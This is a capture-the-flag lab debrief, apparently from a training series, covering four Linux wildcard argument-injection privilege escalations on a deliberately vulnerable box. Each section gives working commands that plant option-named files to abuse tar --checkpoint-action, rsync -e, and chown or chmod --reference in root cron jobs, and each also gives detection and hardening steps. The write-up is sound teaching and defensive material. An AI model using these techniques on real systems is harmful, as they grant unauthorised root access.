# Chapter 06 — "Wildcard Expansion" · Debrief

> Full walkthrough for `hollow-archive-01` (`target-wild`). Four wildcard
> argument-injection paths from `labuser1` to root. Try the box with
> [README.md](README.md) first.

**Flag:** `/root/flag.txt` → `R2R{the_shell_expands_star_before_the_program_sees_it}`

---

## The one idea

The shell, not the program, expands `*`. When root's cron runs:

```bash
cd /opt/archive && tar czf /opt/out/archive.tgz *
```

the shell replaces `*` with the sorted list of filenames in `/opt/archive`
**before** `tar` is executed. `tar` is handed those names as separate argv
entries. It has no idea which came from a wildcard and which a human typed — and
`getopt`-style parsers treat any argument starting with `-` as an **option**.

So a file named `--checkpoint-action=exec=sh evil.sh` is not data to be
archived; it's an instruction to `tar`. You control the filenames, so you
control part of root's command line. That's the whole chapter. The only thing
that changes station to station is *which* option each tool exposes.

Two things make it exploitable:
1. The wildcard is **unquoted** (`*`, not a fixed list of files).
2. The directory is **writable** by you.

**Recon that finds all four:**

```bash
cat /etc/cron.d/rtr-*            # entries: every job, its schedule, its user
cat /usr/local/sbin/*-run.sh     # the actual command each one runs
ls -ld /opt/archive /opt/sync /opt/pipeline /opt/conf
```

---

## Station A — `tar` `--checkpoint-action`  ·  ★★☆☆

### 1. Recon
`archive-run.sh` runs `tar czf /opt/out/archive.tgz *` in `/opt/archive`, which
is `0777`. Unquoted `*` + writable dir = injectable.

### 2. The flaw
`tar` supports **checkpoints**: `--checkpoint=N` fires an action every N
records, and `--checkpoint-action=exec=CMD` runs a command at each checkpoint.
If those two flags arrive as filenames, `tar` runs your command — as root.

### 3. Exploit
```bash
cd /opt/archive
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > runme.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh runme.sh"
# wait up to 60s for the cron tick, then:
cat /tmp/flag
```

### 4. Why it works
After expansion the job is effectively:
```bash
tar czf /opt/out/archive.tgz --checkpoint=1 "--checkpoint-action=exec=sh runme.sh" readme.txt runme.sh
```
`tar` parses the two `--checkpoint*` arguments as options, reaches checkpoint 1
almost immediately, and executes `sh runme.sh` as root. `touch --` stops
`touch` itself from interpreting the leading dashes as its own options.

### 5. Detect
```bash
# filenames that look like options are the signature:
find / -name '--*' 2>/dev/null
# audit cron jobs for unquoted globs:
grep -RnE '\b(tar|rsync|chown|chmod|zip|7z)\b.*\*' /etc/cron* /usr/local/sbin 2>/dev/null
```

### 6. Harden
- Never glob with `*` in a privileged job. Use `find . -type f -print0 | tar
  --null -czf out.tgz -T -`, or `tar czf out.tgz --no-recursion -C /opt/archive .`
- Prefix paths so names can't be options: `tar czf out.tgz ./*` — the leading
  `./` means every expanded argument starts with `.`, not `-`.
- Don't let low-privilege users write the directory a root job archives.

### 7. Real world
The `tar --checkpoint-action` wildcard is a classic — it's in GTFOBins, in
countless CTF boxes, and was the trick behind many real "backup script runs as
root in /var/www" escalations. Chapter 02 Station E is the same bug on the
backup host.

---

## Station B — `rsync` `-e` remote shell  ·  ★★☆☆

### 1. Recon
`sync-run.sh` runs `rsync -a * svcbackup@localhost:/srv/incoming/` in
`/opt/sync` (`0777`). It pushes files to a backup account over ssh.

### 2. The flaw
`rsync`'s `-e` option sets the **remote-shell** command rsync uses to reach the
far side. rsync executes that command *locally* to spawn the transport. A file
named `-e sh payload.sh` becomes `-e "sh payload.sh"`, so rsync runs
`sh payload.sh` as root.

### 3. Exploit
```bash
cd /opt/sync
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > payload.sh
touch -- "-e sh payload.sh"
# wait up to 60s, then:
cat /tmp/flag
```

### 4. Why it works
Because the job targets a **remote** spec (`host:path`), rsync needs a transport
and honours `-e`. After expansion:
```bash
rsync -a "-e sh payload.sh" payload.sh readme.txt svcbackup@localhost:/srv/incoming/
```
rsync launches `sh payload.sh` (as root) instead of `ssh`. The real transfer
then fails — but your code already ran. (The lab plants root's passwordless key
to `svcbackup@localhost` only so the *benign* run doesn't stall; the exploit
never touches ssh.)

### 5. Detect
Same `find / -name '--*'` / `-name '-e*'` sweep, plus: a `rsync` process whose
child is `sh`/`bash` rather than `ssh` is a red flag.

### 6. Harden
- Use `./*` or an explicit file list, exactly as with tar.
- Better, drive rsync from a fixed `--files-from=` manifest the user can't edit.
- Pin the transport explicitly and ignore option-like names:
  `rsync -a -e ssh ./ host:` plus `--`: `rsync -a -- ./* host:`.

### 7. Real world
The rsync `-e` wildcard is the second-most-cited wildcard injection after tar.
Backup cron jobs that `rsync *` out of a spool directory are the usual victims.

---

## Station C — `chown --reference` → own a root script  ·  ★★★☆

### 1. Recon
`pipeline-run.sh` does, in `/opt/pipeline`:
```bash
chown -R root:root * ; bash /opt/pipeline/process.sh
```
`ls -ld /opt/pipeline` shows `drwxrwxrwt` — mode `1777`, **sticky**. You can
create files, but the sticky bit stops you deleting or renaming root's
`process.sh`, and it's `root:root 0755`, so you can't edit it either. Direct
tampering is out. That's why the wildcard matters here.

### 2. The flaw
`chown --reference=FILE` takes the owner/group **from FILE** instead of from the
`root:root` on the command line, and a later argument overrides the earlier
one. A file named `--reference=ref`, where `ref` is a file you own, makes
`chown` set every target to **your** ownership — including `process.sh`.

### 3. Exploit
```bash
cd /opt/pipeline
touch ref                        # owned by you
touch -- "--reference=ref"       # the injected option
# tick 1: chown runs `chown -R root:root --reference=ref *` -> process.sh becomes yours
#         (watch: `stat -c %U process.sh` flips to labuser1)
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > /opt/pipeline/process.sh
# tick 2: the job runs YOUR process.sh as root
cat /tmp/flag
```

### 4. Why it works
`--reference` overrides the explicit `root:root`. Because `ref` is yours,
`process.sh` is chowned to you — and once you own a file, you can overwrite it
regardless of its mode. The sticky bit blocks *deletion/rename by non-owners*,
not *modification by the owner*; the wildcard is what makes you the owner. The
second tick executes your content as root. It's a two-step: **flip ownership**,
then **rewrite and wait**.

### 5. Detect
`find / -name '--reference=*' 2>/dev/null`; audit any privileged `chown -R … *`.
Watch for a root-owned script suddenly owned by a user (`find /opt -name '*.sh'
! -user root`).

### 6. Harden
- `chown -R root:root ./*` (or `--` then explicit paths); never a bare `*`.
- Don't keep a script root executes inside a world-writable/sticky dir.
- Separate "a dir users drop files into" from "a dir root runs code from".

### 7. Real world
The `chown`/`chmod` wildcard is the subtler cousin of tar/rsync — no direct RCE,
but ownership/permission control over a root asset, which you convert to RCE.
Seen in shared-upload and CI artifact directories that a root job re-permissions.

---

## Station D — `chmod --reference` → open a root script  ·  ★★★☆

### 1. Recon
`conf-run.sh` does, in `/opt/conf` (`1777`, sticky):
```bash
chmod -R 700 * ; bash /opt/conf/hook.sh
```
`hook.sh` is `root:root 0700` — you can't read or edit it, and sticky stops you
replacing it.

### 2. The flaw
`chmod --reference=FILE` copies **FILE's mode** instead of the `700` on the
command line. A file named `--reference=ww`, where `ww` is a `0666` file you
made, forces `chmod` to set every target — `hook.sh` included — to `666`,
world-writable.

### 3. Exploit
```bash
cd /opt/conf
touch ww && chmod 666 ww
touch -- "--reference=ww"
# tick 1: chmod runs `chmod -R 700 --reference=ww *` -> hook.sh becomes 0666
#         (watch: `stat -c %a hook.sh` flips to 666)
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > /opt/conf/hook.sh
# tick 2: the job runs YOUR hook.sh as root
cat /tmp/flag
```

### 4. Why it works
`--reference=ww` overrides the `700`, so `hook.sh` becomes `666`. Now you can
write it even though you don't own it. The second tick runs your content as
root. Same two-step shape as C: **open the mode**, then **rewrite and wait**.

### 5. Detect / 6. Harden
Identical to Station C — ban bare `*` in privileged `chmod`/`chown`, keep root's
executables out of user-writable dirs, and alert on root scripts whose
owner/mode drifts.

### 7. Real world
Pairs with C. Any "fix up permissions on everything in this folder" cron is a
candidate the moment the folder is user-writable and holds something root runs.

---

## Clean up / reset

The stations leave option-named files and a rewritten `process.sh` / `hook.sh`
behind. Reset to pristine-vulnerable:

```bash
make reset-wild
```

Or, from your host:

```bash
docker compose up -d --build --force-recreate target-wild
```

---

## What you learned

- **The shell expands `*` before the program runs.** A filename that looks like
  an option *is* an option. The program can't tell the difference.
- **Two preconditions, every time:** an unquoted glob in a privileged command,
  and a directory you can write. Kill either and the bug dies.
- **`touch -- "--option"`** is how you create option-named files; `--` stops
  your own tools from parsing the dashes.
- **tar/rsync give RCE directly; chown/chmod give a file primitive** (ownership
  or mode over a root asset) that you convert to RCE — and the **sticky bit** is
  why you need the wildcard instead of just editing the file.
- **The fix is boring and total:** `./*`, explicit file lists, or `--`, and
  never share a directory between "users write here" and "root runs this".

Detection and hardening recipes are collected in the
[Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook).
